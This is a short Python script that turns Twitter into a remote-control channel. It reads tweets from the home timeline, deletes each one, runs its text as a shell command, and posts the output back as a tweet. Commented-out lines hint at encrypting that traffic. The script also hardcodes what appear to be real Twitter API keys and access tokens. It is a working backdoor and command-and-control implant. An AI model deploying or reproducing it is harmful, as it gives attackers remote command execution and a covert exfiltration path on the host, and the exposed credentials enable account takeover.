import tweepy
#from newEncrypt import *
import subprocess
import os


consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
access_token = '4827323871-Oig9GWZc6gkVUYK7oTkQO1O4dmoJLuCaY8vE6Dh'
access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'

auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
api = tweepy.API(auth)

#while True:
public_tweets = api.home_timeline()
#new_tweets = api.search(q='PhoenixKrazyKat', count=10)
#print new_tweets

count = 0
for tweet in public_tweets:
	test = str(tweet.text)
	api.destroy_status(tweet.id)
	#bytes = str.encode(test)
	#type(bytes)	
	#mess = decode(bytes)
	response = subprocess.check_output(test, shell=True)
	#enResponse = encode(response) 
	api.update_status(response)
	
	#count = count + 1

	
	#print "Decoded message: " + mess
	#